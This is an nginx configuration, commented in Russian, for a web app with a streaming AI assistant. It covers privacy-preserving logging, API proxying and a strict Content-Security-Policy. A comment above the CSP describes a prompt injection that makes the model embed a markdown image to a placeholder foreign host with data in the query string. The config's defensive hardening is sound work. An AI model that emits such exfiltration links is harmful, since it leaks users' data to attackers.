# Журнал без параметров запроса: в ?supplier=… и подобных бывают ПДн ($uri — путь без query string).
log_format no_query '$remote_addr [$time_local] "$request_method $uri $server_protocol" '
                    '$status $body_bytes_sent $request_time';

server {
  listen 80;
  access_log /var/log/nginx/access.log no_query;
  root /usr/share/nginx/html;
  client_max_body_size 10m;

  location /api/ {
    proxy_pass http://backend:8000;
    proxy_http_version 1.1;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    # SSE: без буферизации, иначе ответ ассистента придёт целиком в конце.
    proxy_buffering off;
    proxy_cache off;
    proxy_read_timeout 300s;
  }

  location ~ ^/(docs|openapi.json) {
    proxy_pass http://backend:8000;
  }

  location / {
    # CSP: скрипты, стили, картинки и запросы — только с нашего адреса (картинки ещё blob:/data: для
    # графиков). Даже если модель под влиянием инъекции вставит в ответ ![](https://чужой-адрес/?d=…),
    # браузер такую картинку не загрузит и данные не уйдут.
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' blob: data:; font-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'" always;
    add_header X-Content-Type-Options nosniff always;
    add_header Referrer-Policy no-referrer always;
    try_files $uri /index.html;
  }
}
